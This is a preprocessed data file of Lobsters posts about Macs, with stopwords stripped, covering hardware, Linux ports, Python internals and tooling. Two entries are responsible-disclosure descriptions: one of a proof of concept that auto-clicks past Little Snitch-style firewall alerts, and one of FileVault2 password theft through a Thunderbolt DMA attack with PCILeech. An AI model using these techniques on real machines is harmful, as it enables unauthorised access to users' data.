bestinclass tech spec expect price match lowestcost vendor expect everything familiar preserved perpetuity expect wowed surprising innovative featuresboth apple presentlydisgruntled user think imagining perfect computer clearly go differently apple start ideal form compromise user look compromised form appeal compromise narrowly often losing sight impact one trade would elsewheredoes microsoft finally taste little bit experience living apple hardware year impression microsoft nascent consumerfacing industrial design earnest hungry find differentiating feature brag also le concerned bulk seam feature require extent thought far tonight really know surface surface book totally sure window rt still thing worried might accidentally walk door arm processor like mentioned lot developer friend recently started singing window praise light discussion mac primacy among developer sure ever sort true believer mac apparently amtruth lately noticed something proud whenever hear developer willfully switching window struggle relate make number harsh judgmental assumption assumption unfair part based atall recent experienceso profound sense shame lack empathy shown developer live windowsland bought firstever microsoftbranded pc surface pro going try use much possible open source development next month using many microsoft stock apps cani expect walk away experience still thinking window usability nightmare open convinced microsoft decade wilderness given agility turn window around going best document observation observation hopeful overly negativeso stay tuned lot angry tweet struggle get used window
474,Lobsters,mac,Apple macOS,Bypass alerts for Little Snitch and Little Flocker on OS X,https://github.com/pwnsdx/Security-Bypass,bypass alert little snitch little flocker o x,unsecure go download page poc work little flocker little snitch handsoff blockblock easy implement new detection mechanism vulnerable version handsoff vulnerable version blockblock vulnerable version little snitch vulnerable version little flocker http timeline http wwwlittleflockercomdownloadschangelog demo license,unsecure bypass alert little flocker little snitch handsoff blockblock concept applied security tool description poc using simple yet powerful trick detect little flocker little snitch handsoff blockblock window appear automatically click allow button calculating distance work pretty well every resolution window appear fraction second use run unsecurerelease want go download page poc work little flocker little snitch even gui scripting disabled handsoff blockblock easy implement new detection mechanism vulnerable version handsoff vulnerable version blockblock vulnerable version little snitch vulnerable version little flocker note macos already builtin mitigation see http kind attack yet implemented security software timeline aug handsoff patched issue quite lately better late never please update well jan objectivesee deployed fix blockblock update asap jan objective development deployed fix little snitch please ensure updated dec little flocker author jzdziarski fixed issue privileged unprivileged user regarding mouse event unprivileged keyboard event unfortunately unable fix root keyboard event see http wwwlittleflockercomdownloadschangelog also added touchbar support denyallow immune attack dec repository made public demo license mit license mit copyright c sabri haddouche sabri riseupnet permission hereby granted free charge person obtaining copy software associated documentation file software deal software without restriction including without limitation right use copy modify merge publish distribute sublicense andor sell copy software permit person software furnished subject following condition copyright notice permission notice shall included copy substantial portion software software provided without warranty kind express implied including limited warranty merchantability fitness particular purpose noninfringement event shall author copyright holder liable claim damage liability whether action contract tort otherwise arising connection software use dealing software
475,Lobsters,mac,Apple macOS,New MacBook Pros Fail to Earn Consumer Reports Recommendation,http://www.consumerreports.org/laptops/macbook-pros-fail-to-earn-consumer-reports-recommendation/,new macbook pro fail earn consumer report recommendation,yes battery life lab test reveal problem three different macbook pro model,yes battery life lab test reveal problem three different macbook pro model
476,Lobsters,mac,Apple macOS,"Goodbye DxO, hello Red Hat",https://grenouillebouillie.wordpress.com/2016/12/21/goodbye-dxo-hello-red-hat/,goodbye dxo hello red hat,dxo one spice hpvm back linux impressed synology diskstation update worked second time tried never enough storage redmine jenkins issue reported github regarding installation synology diskstation builtin software terramaster converting mac mini server fedora server redmine jenkins bitnami stack docker done button bottom right folk attempt boot raid array attempt boot internal disk regular keyboard mouse issue dnf many software packaging tool need hawaii desktop probably beautiful need working keyboard hawaii destkop systemd cockpit almost nothing well cockpit synology dsm cockpit work safari nfs good remember work without kerberos creating vm box poof mac book pro installation near disaster recognize efi partition osx boot anymore old known bug wifi driver crash freebox revolution known old bug added comment kernel bugzilla one ubuntu forum deal issue disconnect screen reboot double plus annoying like,one year half dxo working dxo one diminutive yet highly capable camera fit pocket connects iphone decided move join red hat work spice focusing acceleration virtual machine free software virtualization together working old colleague hpvm era karen noel denise duma love back linux impressed using macosx primary desktop since day rhapsody always linux virtual machine running occasion dwindling number machine home running linux notably couple raspberry pi synology diskstation installed linux usually went ubuntu good job polishing user experience build ring includes number virtual machine running several major distros testing purpose quite inactive repairing shortterm todo list working red hat thought use fedora primary desktop experience bit underwhelming far unfortunately three day managed render mac book pro unbootable osx update worked second time tried several different issue skippy laggy mouse cursor even nonresponsive keyboard driver crash attempting access home wifi found hard way nfs performance horrible use google trivial thing way often complained several time blog perceived degradation osx software quality since experience linux put serious perspective never enough storage describe woe linux must first describe storage wanted manage application want run mostly objective able test run software large number virtual machine configuration without running disk space every day also would like setup redmine jenkins automate build various open source project maintain variety platform lately issue reported github regarding installation example primary file server home synology diskstation storage roughly available working like charm several year find builtin software really easy use ton feature connected rest house bond switch us btrfs filesystem although moment much use replication snapshotting hope setup btrfs replication someday also terramaster initially used jbod configuration host variety old disk various size backup synology na machine home unfortunately rather severe cleaning lady incident damaged two disk one died old age btrfs good file system much disk die within one week lucky backup ended reprovisioning disk order able activate hardware box go macosx window software activate hardware raid osx software worst instance fugly cartoonscifi user interface seen since say commodore amiga day bizarro shaped window round dialog box ok button diagonal attempt competing egregious waste pixel space history mankind category design effort yet application even icon show default application icon seriously really matter enable hardware raid utility setting stick use raid array linux one big disk far work like charm need highcapacity storage home work ok linux osx window recommended bit concerned happens disk go bad though led front tell would liked get email option osx software pretty sure part setting stick connect array synology converting mac mini server fedora server first thing tried converting old mac mini server vintage cpu ram run thing like redmine jenkins act backup file server used run osx using bitnami stack really tempted try docker instead done button bottom right folk fedora installer globally allright except one thing really annoys reason setup page big blue done button sitting top left window last place would search believe spent something like minute searching done button place eye carefully avoiding one place assumed could finally side glance made realize button back done standard placement button page left back right forward done probably file usability bug one oh way thing happen click button labelled next done otherwise keep looking thing actually next page configuration process attempt boot raid array initial intent install linux terra master array boot hoping would able boot machine wanted mac mini old may die time even apple hardware usually last reason installing like never quite worked since mac mini server dvd installed usb stick installation usb stick devsdc raid array devsdd installation remove usb stick array becomes devsdc somehow confuses grub bootloader render system unbootable need usb stick boot external disk rather tell grub startup script code try identify disk id tell code work least configuration attempt boot internal disk mac mini server two internal disk thought rather risk free operation dedicate one linux initially setup split started installing rationalized better choice way raid disk capable mac mini server usb port quite lot tiny machine meant using full bandwidth raid figured would better connect raid disk synology access network would get better bandwidth also would mean synology would able backup full speed end fully functioning fedora server regular keyboard mouse issue second installation refused accept keyboard input realized changed keyboard thinking old pc keyboard used dead key would stick work type letter two three time get sometimes would stick type hello type something like e e e del del del l l l l del e stuck saw eeeee screeen rather horrible actually software glitch ask explain turn every boot fedora installer real trouble usb mouse keyboard symptom vary unresponsive keyboard skippy mouse key tried swapping device changing usb port avail funny reason installation worked applebranded keyboard installation really like much anymore wanted old pc go figure sarcasm good thing practically never need keyboard mouse plus easy excuse linux yet fully supporting newfangled technology sarcasm input device glitch mile booting fedora workstation mac book pro trackpad also stick way annoying enough notice clear enough describe happens exactly trackpad somehow slow react explain exactly know way le comfortable osx rather terribly frustrating keep missing target screen kind user experience glitch really annoying dnf many software packaging tool need remember rpm red hat package manager defacto standard linux installation tool one big alternative course debian aptget turn aptget got big boost since consequence integrated ubuntu back mouse mouse used linuxsupported connector ubuntu radar yet frankly aptget install lot typing relative rpm short quite content rpm time rpm replaced yum reason remain least mystery rpm evolve incorporate goody yum oh well still quite bit shorter aptget apparently still use rpm although sure good idea barely getting used yum replace dnf come seriously apparently stand dandyfied yum reason switch repair broken dependency algorithm worth changing name case still get used typing dnf quite often finger autopilot type something else true word like dns hawaii desktop probably beautiful need working keyboard server edition come gui thought would install nice notion group dnf opted hawaii destkop everything installed fine process learned enable runlevel systemd desktop quite frankly liked one thing reason login screen hawaii accept keyboard input annoying linux keyboard keyboardobsessed person like working occasion cockpit almost nothing well one advertised feature fedora server cockpit based experience synology dsm clearly expecting much cockpit actually much little seems relatively well issue http certificate server apparently cockpit work safari secure mode wanted use free certificate letsencrypt requires publiclyavailable server reason address certbot connect server failed authorization procedure myservercom urn acme error connection server could connect client verify domain failed connect challenge use cockpit much anyway fire chrome ok nfs good remember since mac mini accessing hard disk remotely figured would able connect remote directory synology using nfs actually work somewhat several issue could get user id mapping work correctly despite much fiddling nfsidmap c etcidmapdconf apparently known thing work without kerberos bug recent year old ended change user id mac mini server match one synology rather high latency put home nfs used lab workstation back engineering school say back worked ok nowadays sure desktop sometimes pause several second presumably waiting nfs respond local network le one meter cable nfs server client expected good performance reserve judgement though synology still major firsttime backup may impact response time key feature btrfs transparent network notably snapshotting docker apparently smart enough use btrfs snapshot internally available see varlibdocker mean probably use btrfs replication backup stuff creating vm box poof since going work virtual machine wanted try create couple small vms testing purpose typing virtualization software showed two product box virtual machine manager time try first time ran box asked iso file iso file nfs sever tried go grab one time select iso file box gone poof second attempt slightly successful fortunately software go poof irritating mac book pro installation near disaster red hat provided mac book pro since one choice machine developer assumed well supported fedora couple installs mac mini server given confidence installation process wrong resized primary osx volume hard disk making room fedora install put usb stick machine started installer immediately noticed trackpad behaving ok minor nuisance frankly stage happy builtin keyboard working recognize efi partition first thing caused problem installer kept telling existing efi partition good kept getting message needed efi partition gptformatted disk mounted bootefi exactly thought end gave thought wasting disk space second efi partition big deal installation proceeded ok installation working fedora workstation osx boot anymore time reboot osx uh macosx menu entry fedora menu work complains various xnu command found apparently old known bug well though major problem mac graphical boot menu since fedora forced create additional efi partition could possibly messed right wrong booting holding alt showed fedora entry brought nonfunctioning ugly textmode grub menu expected osx entry gone mac osx recovery partition gone aaaaargh fedora really went way make machine unbootable know better would think played microsoft wifi driver crash least fedora fully usable o shrug setup thing like mail client etc problem wifi access half house living room best wifi access point freebox revolution always reject password dmesg show something bit frightening wifi driver simply crash every time try enter password brcmfmac code cut warning cpu pid module linked rfcomm fuse nfconntracknetbiosns nfconntrackbroadcast xtct xtconntrack ipset nfnetlink ebtablenat ebtablebroute bridge stp llc iptablemangle iptablenat nfnat nfconntrack iptableraw iptablesecurity ebtablefilter ebtables cmac bnep hfsplus intelrapl intelpowerclamp coretemp kvmintel btusb sndhdacodeccirrus sndhdacodecgeneric sndhdacodechdmi brcmfmac kvm btrtl btbcm btintel joydev bluetooth brcmutil sndhdaintel sndhdacodec applesmc itcowdt irqbypass itcovendorsupport inputpolldev sndhdacore mmccore sndhwdep sndseq ghashclmulniintel intelcstate inteluncore meime intelraplperf sndseqdevice rfkill mei sndpcm lpcich thunderbolt sndtimer snd soundcore shpchp sb sbshc acpials applegmux kfifobuf industrialio video tpmtis tpmtiscore tpm applebl nfsd authrpcgss nfsacl lockd grace sunrpc uas usbstorage hidapple btrfs xor amdkfd radeon drmkmshelper ttm drm fjes cpu pid comm tainted g w hardware name apple inc bios workqueue call trace end trace apparently known old bug added comment kernel bugzilla one ubuntu forum deal issue least give hint fix thing use band would good hint using shrug disconnect screen reboot another funny thing happened connected external display mac book pro use google understand use display control panel setup external display primary much ease use although quite simple soon understand big icon left represent display action display set took laptop disconnecting external display without much second thought see mac laptop always behaved correctly since around sort expected linux late would something equally smart case got big secondary screen obvious way anything sometimes screen would dim knew popping dialog box display know display longer connected machine sarcasm guess linux ahead time trying connect display wifi using wifi driver crashed sarcasm tried various thing including old keyboard shortcut used give text console apparently configured fedora killing x server worked brought back another x server display setup end forcereboot mac contemplate lack macosx display option boot sigh double plus annoying overall spent le three day linux already plagued several severe bug none area supposed work fedora installer making osx non bootable wifi driver crash kernel usb keyboard sticky non responsive key installer usb keyboard working hawaii desktop server edition usb mouse skipping every boot wayland mac mini builtin trackpad tracking intuitively mac book pro lack detection disconnected display low nfs performance nonworking nfs id remapping box going poof selecting iso file installer done button upperleft corner screen probably forgetting already fair number issue short period time good news apparently work love linux like like loading related
477,Lobsters,mac,Apple macOS,Some Copland Documentation,https://512pixels.net/2016/12/some-copland-documentation/,copland documentation,,copland apple failed attempt modernize classic mac o mid part would end mac o dream modern mac operating system realized apple bought next copland really interesting sad chapter mac history document collected year mac o build preview build copland ran select hardware connected via serial cable power mac running special debugger program good time
478,Lobsters,mac,Apple macOS,macOS FileVault2 Password Retrieval,http://blog.frizk.net/2016/12/filevault-password-retrieval.html,macos password retrieval,pcileech github presented,macos let attacker physical access retrieve password clear text plugging thunderbolt device locked sleeping mac password may used unlock mac access everything secure mac update december patch anyone including limited colleague police evil maid thief full access data long gain physical access unless mac completely shut mac sleeping still vulnerable stroll locked mac plug thunderbolt device force reboot ctrlcmdpower wait password displayed le second check demo video video possible core issue two separate issue first issue mac protect direct memory access dma attack macos started efi running early stage enables thunderbolt allowing malicious device read write memory stage macos yet started macos resides encrypted disk must unlocked started macos started enable dma protection default second issue filevault password stored clear text memory automatically scrubbed memory disk unlocked password put multiple memory location seems move around reboots within fixed memory range make easy plug dma attack hardware reboot mac mac rebooted dma protection macos previously enabled dropped memory content including password still though time window second memory containing password overwritten new content pcileech dma attack hardware attached mac victim pcileech hardware connected run macfvrecover command attacker computer retrieving filevault password pcileech correct password donaldduck detail password entered stored memory unicode every byte zero password consisting ascii character used enter random phrase naturally occurring memory password prompt example phrase eerrbbnn used memory stored search using pcileech notice phrase stored multiple memory location per example searching mac memory test phrase eerrbbnn finding memory location possible look one might reattach attack device mac first read fails location found checked password clearly visible addition signature may scanned also found beginning memory page read phrase clearly visible memory location try yes absolutely download pcileech github purchase hardware password recovery tested found work multiple macbooks macbook air thunderbolt attack tested recent mac usbc password recovery may fail user us special non ascii character password case memory dump saved manually searched password please note trying mac might legal note recovering password one thing possible unless security update applied since efi memory overwritten possible evil disclosure timeline follows end july issue found august pcileech presented released def con filevault issue mentioned august apple notified august apple confirmed issue asked hold disclosure december apple released macos contains security update least hardware like macbook air conclusion solution apple decided upon rolled complete one least extent able confirm longer possible access memory prior macos boot mac one secure platform regard specific attack vector update issue classified
479,Lobsters,mac,Apple macOS,Building ZealDocs for OSX,http://stratus3d.com/blog/2016/12/09/building-zealdocs-for-osx,building zealdocs osx,zealdocs dependency download zealdocs configure build install done conclusion dash update automation checked dotfiles repository reference,zealdocs open source qt app provides offline documentation browsing crossplatform supported osx using zealdocs ubuntu machine wanted use osx figured possible get compiled osx trial error finally figured using osx came step tweak process may necessary running latest version osx dependency first need install zealdocs dependency using homebrew easy brew install libarchive using homebrew need either find equivalent package package manager install package hand download zealdocs cd directory want build zealdocs move application compiled clone enter project directory git clone http githubcomzealdocszealgit cd zeal configure need add include lib path sqlite libarchive library srclibscorecorepri file find version package installed running brew info package name command ran looked like cat eof srclibscorecorepri macx includepath libs larchive includepath libs eof course sqlite libarchive version may different note critical step path wrong build fail build everything configured build zealdocs makefile make go well see zealapp directory inside project bin directory install copy zealapp directory application directory install cp binzealapp application application directory tell osx run app even though identify developer done able open app begin using finally zealdocs started command line search term could add appropriate path path found alias little easier add bashrc want make zeal available alias shell alias zealapplicationszealappcontentsmacoszeal start new shell session able use zeal zeal erlang ping conclusion pretty happy zealdocs far nice run osx well linux distros since zeal cross platform really integrate anything osxspecific looking something little nicer check dash dash proprietary app extra feature make little easier use osx update automation writing post realized would nice bash script wrote one checked dotfiles repository reference
481,Lobsters,mac,Apple macOS,Making getaddrinfo Concurrent in Python On Mac OS and BSD,https://emptysqua.re/blog/getaddrinfo-cpython-mac-and-bsd/,making getaddrinfo concurrent python mac o bsd,ran fine linux came grief mac man page getaddrinfo o x source getaddrinfo warning vanished largely rewritten leave silver coin within year day getaddrinfo call mdns module mdnsresponder project dnsservicequeryrecord grayhaired legendary share enjoy tiny coven nyc bsd user sign trident netbsd getaddrinfo test netbsd codehoard rest heap cv repo related story testing eskimo secret letter python allow concurrent hostname resolution getaddrinfo thread safe since made short work lock mongodb engineering journal terry mark,tell u time made dns resolution concurrent python mac bsd want hear story friend nothing old lore ifdefs made python scalable saga steve job sung mysterious wizard fanciful nickname tell u gather round tell unearthed lost secret unbound python old shackle banished ancient horrible mutex troll let u begin beginning long time ago coven berkeley sorcerer crafted operating system named berkeley software distribution bsd generation nurtured growing adding feature one night conjured powerful function could resolve hostnames address called getaddrinfo function mighty year come would grow dangerous sorcerer made getaddrinfo threadsafe age passed bsd spawned many offspring freebsd openbsd netbsd time mac o x made copy getaddrinfo thread safe different time different way operating system retained scribe recorded event annals getaddrinfo ringed round mystery artisan make crossplatform network library mistrusted thread safe often hired mutex troll stand guard prevent one thread using getaddrinfo concurrently widespread library python socket module distributed python standard library mac bsds python interpreter hire mutex troll demand python thread hold special lock calling getaddrinfo behold friend getaddrinfo lock python socketmodulec system getaddrinfo believed threadsafe includes getaddrinfo emulation protect access lock defined withthread amp amp defined apple defined freebsd amp amp lt defined openbsd defined netbsd defined vms defined havegetaddrinfo define usegetaddrinfolock endif ifdef usegetaddrinfolock define acquiregetaddrinfolock pythreadacquirelock netdblock define releasegetaddrinfolock pythreadreleaselock netdblock else define acquiregetaddrinfolock define releasegetaddrinfolock endif lock widely known although python global interpreter lock certainly infamous getaddrinfo lock known battleworn mutex troll required lock python interpreter installed mac netbsd openbsd freebsd first descried hunting deadlock caused pymongo since mercenary troll met combat deadlock error slowdown python code led renewed confrontation met python expert learned encountered hired troll example multithreaded python code crawl thousand website must resolve thousand host ran fine linux came grief mac thread would wait long queue acquire lock troll guard would allow call getaddrinfo one slow dns resolution would block thread behind would throw timeouts could ever grasp lock day python artisan hired mutex troll needed safeguard getaddrinfo concurrent thread troll longer needed knew getaddrinfo made thread safe bsd child especially famous mac o x many modern program call getaddrinfo concurrently suffer harm mongodb server example run fine mac without getaddrinfo lock troll enforce mercenary contract eternal decade stood guard lock grown corrupt greedy time come banish horrid thing whenever read comment past craftsman system getaddrinfo believed threadsafe ire boiled hotter enthrall mere belief knowing truth one winter morning last year stood companion daily status meeting asked leave endeavor quest told mutex troll held mac bsd coder hostage generation made great boast would defeat mutex troll python free thread gladly fellow mongodb granted leave go journey banish troll good cried raised flagon diet coke drank good fortune donned wargear sallied mongodb castle dispel mutex troll power python enough say perchance getaddrinfo broken surely mended getaddrinfo fixed could prove python core developer developer unlike mongodb coder must support ancient version o x dawn time convince would need know answer certain decided ask apple engineer aid cause apple engineer like shy secretive folk publish code must darwin coming going recorded bug tracker work changelog learn secret one must delve deep wild hill journeyed tower apple cleric gathered entered deserted tower found carved wall man page getaddrinfo o x warned getaddrinfo bsd library function manual bug implementation getaddrinfo threadsafe december read source getaddrinfo uncertain beheld guessed saw data race getaddrinfo call gailookupd read writes global static variable gaiproc seemed illwrought multithreading o x warning vanished man page getaddrinfo function largely rewritten believe bug fixed decade ago wept bitterly year needle toil programmer processor suffered hand troll pitied falter would prove free troll domination yet diffing one version getaddrinfo next unprofitable understand saw needed answer apple ask question apple engineer friend must leave silver coin hollow oak tree wait may take day season apple engineer come whisper ear bind secret pact must never reveal told engineer give asking ring must use ask second question within year day power lost returned mongodb asked companion silver coin gave gladly first night first day year left hollow oak question getaddrinfo fixed give public statement link resolved bug tracker need way know fixed prove others yet know second question would twelve day twelve night waited refreshing email today day today twelfth morning january awoke see ancient box rusted hinge hoared lichen resting bed box opened exhaling dust forgotten smithy first network code forged slowly reached lifted scroll marked assembly code unfurled crackle friend tell learned message secret spoken bound keep may relate part story wizard brilliant foolish named job came pas job exiled apple crown throne taken banished company wandered deep forest gathered coven witch conjure new operating system called next child bsd daemon called lookupd power resolve host bound serve within year passed job fellow apple hearing rumor next greatness sent emissary beg job return job restored king apple engineer wrought first version o x offspring bsd dns system mix new o x feature mdnsresponder open directory along daemon lookupd next libresolv old bsd aha cried o x version whose getaddrinfo threadsafe python first ported mac rightly hired mutex troll guard getaddrinfo allow one host resolution time unfurling scroll read version system cleaned depend o x mdnsresponder consistently process getaddrinfo became threadsafe getaddrinfo call mdns module libinfo next libinfo scroll author written margin presence name library remnant original netinfo architecture mdns module us something called dnssd api wellknown thread safe dnssd api part mdnsresponder project key function dnsservicequeryrecord see ipc mdnsresponder process point thread safety assured scroll signed ornate hand share enjoy quinn eskimo message loremaster quinn grayhaired mightyfingered hacker legendary eskimo named bob dylan lyric shout hitchhiker guide battle cry share enjoy dusty wooden chest beneath place scroll asking ring left day would need ask second question eskimo message spurred courage knew would prove getaddrinfo called concurrently failed worked modern mac done mutex troll power would dispelled get hand vm went ebay acquired antique dvd arduous day night toiled googling candlelight incantation could breathe ancient spirit life virtualbox last creature arose needed advice bsd witch test getaddrinfo old o x tiny coven nyc bsd user meet tavern called stone creek near dwelling aged fierce made sign trident supplicated humbly advice kindly one netbsd developer named christos zoulas showed netbsd getaddrinfo test resolve hundred hostnames ten thread plucked test netbsd codehoard rest heap cv repo next task quest required compiler happily xcode come dvd installed compiled netbsd getaddrinfo test prayed test would fail would reproduced bug shown getaddrinfo threadsafe assuming test passed modern o x could show mutex troll reason obsolete heart quivered prayed spirit ancient codesmiths raised finger keyboard invoked program hresolvtest thank spirit smiled fortune test failed compiled test laptop running o x passed could even see evidence getaddrinfo concurrency mac thread reduced total time resolve host green happy kingdom pythonistas hastened news ti mended getaddrinfo bug o x fixed decade ago reign mutex troll shall ended related story testing eskimo secret letter time use second question needed discover ifdef mac o returned lichened chest took asking ring wearing finger spoke preprocessor symbol rely tell o x newer ring blazed heat cast listened answer none despondent lay slept next morning ring vanished chest new scroll eskimo answer include availabilitymacrosh check acquired knowledge weapon needed could fulfill boast made month banish mutex troll free mac user getaddrinfo lock defined withthread amp amp defined apple defined withthread amp amp defined apple amp amp macosxversionminrequired lt defined freebsd amp amp lt defined openbsd defined netbsd defined vms defined havegetaddrinfo define usegetaddrinfolock endif patch approved guido van rossum merged core developer ned deily guido praise saying thanks thorough work look closely code friend see python freebsd later already free troll knight maxim sobolev updated python allow concurrent hostname resolution openbsd netbsd yet suffered demand mutex troll openbsd getaddrinfo thread safe since need lock o netbsd getaddrinfo fixed long ago christos zoulas answered call aid went bsd witch tavern blood still hot victory o x made short work lock remaining bsds annals wellkept easily found unlike apple trouble persuading python developer guard needed os without word mercenary troll shouldered axe trudged search patron platform never would hold hostage worthy smith forging python code bsd pondered vms still list nonthreadsafe getaddrinfo implementation vms fixed getaddrinfo could python concurrent resolution swordarm weary retired leaving foe prove mettle future hero crossposted mongodb engineering journal illustration terry mark
482,Lobsters,mac,Apple macOS,"Simple SCSI Target framework, built for performance and density",https://github.com/gostor/gotgt,simple scsi target framework built performance density,gotgt scsi iscsi getting started build use quick overview source code test openiscsi libiscsi test directory performance roadmap contributing contributing documentation,gotgt gotgt project simple scsi target framework implemented golang built performance density briefly iscsiscsi target go implementation includedimported library allow upper layer iscsi client communicate actual scsi device target configuration static json file time core functionality target library provides iscsiscsi protocol service simple flat file based lun target implementation provided plugin interface future formal plugin mechanism provided supported work sophisticated backend storage array scsi small computer system interface scsi set standard physically connecting transferring data computer peripheral device scsi standard define command protocol electrical optical interface scsi commonly used hard disk drive tape drive connect wide range device including scanner cd drive although controller handle device iscsi iscsi acronym internet small computer system interface internet protocol ip based storage networking standard linking data storage facility nutshell provides blocklevel access storage device tcpip network getting started currently gotgt heavy development release binary far build source one binary name gotgt start daemon via gotgt daemon control via gotgt listcreaterm build need make sure go installed system automake package installed also gotgt repository cloned gopath mkdir p gopathsrcgithubcomgostor cd gopathsrcgithubcomgostor git clone http githubcomgostorgotgt gotgt cd gotgt make use lack command operate target lu however init targetlu config file gotgtconfigjson may find example please note want use example make sure file vartmpdiskimg exists quick overview source code source code repository right organized two main portion ie cmd pkg directory cmd directory implementation intended manage target luns tpgts includes create remove list action provides functionality daemon future fully enhanced implemented would take restful syntax well pkg directory three main piece ie api interface scsi layer iscsi target layer api interface provides management service create remove target iscsi target layer implement protocol required receive transmit iscsi pdu communicates scsi layer carry scsi command processing scsi layer implement scsi spc sbc standard talk scsi device attached target library note example directory intended show static configuration serve backend storage simplest configuration one lun one flat file behind lun question json configuration file read beginning iscsi target library instantiation test test openiscsi libiscsi information example test script please refer test directory performance tbd roadmap current roadmap milestone alpha beta completion github issue repository please refer issue worked completed various stage development contributing want help build gotgt check contributing documentation
483,Lobsters,mac,Apple macOS,Configuring iTerm2 for mosh: URLs,https://boinkor.net/2016/12/configuring-iterm2-for-mosh-urls/,configuring mosh url,sshbookmarker faq prerequisite iterm profile guid url handling launchservices launchservices url handling iterm end guid section success next step ansible dynamic profile,use mac main typingcharacterdisplaying computer macos best terminal emulator found far addition also use mosh mobile shell get fast interactive disconnectionresistant sshlike connection host need use commandline order make getting host fast made something set bookmark open new terminal window ruby gem sshbookmarker run launchagent anytime sshknownhosts sshconfig file change drop bunch bookmark directory get indexed spotlight whenever want open remote shell use spotlight type host name handy also use open ssh mycoolserverhorse get new iterm tab ssh session exactly go background work perfectly ssh see set see faq search handler ssh like mosh custom url scheme readily available ssh url handling done year look cobble together solution various rumor stackoverflow article digging source code time blogging solution futureme easier time prerequisite first need use version newer better need mosh install homebrew program location usrlocalbinmosh throughout post also using jq duti tool get homebrew iterm profile guid first need iterm profile dedicated moshing setting want ok need set command usrlocalbinmosh host profile need guid easiest exporting new profile json iterm profile preference select mosh profile created open action gear menu profile list select copy profile json figure profile guid run pbpaste jq guid print uuid double quote make note string going use theguid url handling launchservices url handling macos come two step first run open somescheme host launchservices look program handle given url scheme set handler mosh url use duti duti mosh point running open mosh mycoolserverhorse open new iterm tab open mosh connection yet else need url handling iterm end iterm get instructed open mosh url look url scheme scheme profile mapping since mosh yet let fix replace theguid output jq guid section default write urlhandlersbyguid dictadd mosh theguid restart success worked correctly id line running open mosh mycoolserverhorse open new iterm window running mosh attempting open connection cool example server next step save trouble keeping track guids especially use sort management tool like ansible automatically set mac started experimenting dynamic profile specifying guids host name might pleasing result post update get fully working also yet work mosh url user name specified rather user name get ignored host part get passed mosh likely wrap mosh tool another tool order get work meantime hope enjoy
484,Lobsters,mac,Apple macOS,Linux on the Mac — state of the union,https://lwn.net/SubscriberLink/707616/cf37d7edcb88444f/,linux mac state union,buying subscription past youtube video iosfocused margindriven strategy redis move back linux gpu switching retina lattice u pdf edp lvds renesas nxp pdf ti pdf pericom pdf ifixit driver written added switching control matthew garrett bernhard frömel ddc forshee garrett dave airlie enable gpu switching preretinas documentation vgaswitcheroo apple multiplexer several extra change manually user add runtime power management support rework vgaswitcheroo audio handling functional dependency vertical blanking interval vblank low priority ifixit gpuswitch identify macos firmware interrupt storm thunderbolt thunderbolt writing basic linux driver avoid gratuitously waking controller add runtime power management pcie hotplug port runtime power management thunderbolt controller retrieve property sample coping surprise removal fixing system sleeprelated bug establishing displayportoverthunderbolt tunnel ninth iteration responded pushed review firmware quirk discovered issue early quirk reset wireless card breaking suspend power workaround patch spi input device nvme spi developing experimental outoftree driver missing vendorspecific command conclusion crossmounting classic commercial youtube video log,know lwnnet subscribersupported publication rely subscriber keep entire operation going please help buying subscription keeping lwn net november article contributed lukas wunner macbook pro introduction october caused unusually negative reaction among professional user due realization apple longer caters equally casual professional customer past youtube video instead company appears following iosfocused margindriven strategy essentially relegates professional fringe group wellknown developer salvatore sanfilippo redis project consider move back linux perhaps good moment look current state mac hardware support kernel mac system posse various custom chip undocumented quirk community need painstakingly reverseengineer gpu switching apple remaining vendor build multiplexer hybrid graphic laptop highend lowpower gpus multiplexer allows panel switched gpus unused gpu powered manufacturer use muxless solution whereby discrete gpu headless copy rendered data pcie integrated gpu framebuffer muxed solution one used apple offer superior power saving latency difficult implement multiplexer built preretina macbook pro custom lattice fpga documented extent patent u pdf retina moved different display connector edp instead lvds accommodate higher pixel clock forced apple come redesign consists two chip renesas controller separate offtheshelf edp multiplexer nxp pdf ti pdf pericom pdf preretina macbook pro use lattice blue combine controller multiplexer single custom chip image courtesy ifixit driver controller written seth forshee initially control backlight brightness andreas heider subsequently added switching control matthew garrett bernhard frömel contributed code handle register access register layout predecessor lattice register accessed via mailbox rather directly panel resolution stored video bios notoriously bogus mac need probed instead temporarily switching ddc line gpus attempt implement made forshee garrett dave airlie pursued mainline development therefore stagnated three year started another effort resulting patch finally enable gpu switching preretinas merged byproduct documentation vgaswitcheroo apple multiplexer original unibody macbook pro introduced dual nvidia gpus required several extra change figured pierre moreau one remaining glitch related hardware acceleration console framebuffer worked around loading nouveau nofbaccel option machine longer supported apple since macos sierra notably macos never capable switching runtime model using gpus simultaneously linux squeezing hardware apple ever however lot still remains done far discrete gpu turned manually user begun set patch add runtime power management support handle automatically however turned rework vgaswitcheroo audio handling necessary first based rafael wysocki functional dependency series queued another unresolved issue short flicker switching vertical blanking interval vblank gpus happen sync apple patent talk gmux controller lengthening shortening vblank interval achieve seamless switch reality performed chip need done software instead todo list switching wayland running currently switching possible framebuffer console client connected drm driver airlie stated improving situation low priority retina macbook pro one introduced october use controller yellow accompanying nxp multiplexer inbetween gpu cpu image courtesy ifixit gpu switching preretinas work nt yet retina valid panel resolution stored video bios gpus need probe however unlike preretinas aux channel ddc equivalent displayport switchable gpus without also switching main link active gpu therefore either cache panel data proxy inactive gpu access panel additionally gpus need linktrain edp output displayport specification special provision closed embedded connection allows output set precalibrated knowngood drive current preemphasis level solution would thus inactive gpu set output precalibrated value determined active gpu implemented prototype tested partial success bruno bierbaumer unfortunately bierbaumer macbook pro suffered accident unrelated patch development since stagnated generally hard bring feature like without hardware front sending patch dmesg output back forth get one far machine preretina time retina user consider using bierbaumer gpuswitch application allows selecting active gpu next reboot inactive gpu may powered via vgaswitcheroo conserve energy retina introduced onward additional requirement gpu switching either bootloader efi stub kernel need identify macos firmware otherwise integrated gpu powered thus hidden operating system rationale apple support macos window hardware never bothered enable gpu switching window operating system identify macos efi firmware assumes dealing window disables various feature hardware identification scheme similar spirit acpi osi method happens efi exitbootservices call ie much earlier kernel acpi subsystem initialized necessary model assume window booting legacy bios mode macos otherwise user need aware expose integrated gpu model loading driver result interrupt storm avoided disabling acpi generalpurpose event gpe via sysfs thunderbolt thunderbolt controller comprise pcie switch whose fabric managed either two way firmware component called intel connection manager icm natively operating system former case pci tunnel newly attached device configured system management mode smm behind operating system back device appear acpi pci hotplug slot vendor apple took approach ship two driver efi driver configures device already attached boot macos driver assumes control exitbootservices call booting window apple power controller older machine reconfigures runtime controlled icm model principle apple approach foregoing firmware blob desirable freesoftware perspective however apple driver closed source intel nt made thunderbolt specification public andreas noever took 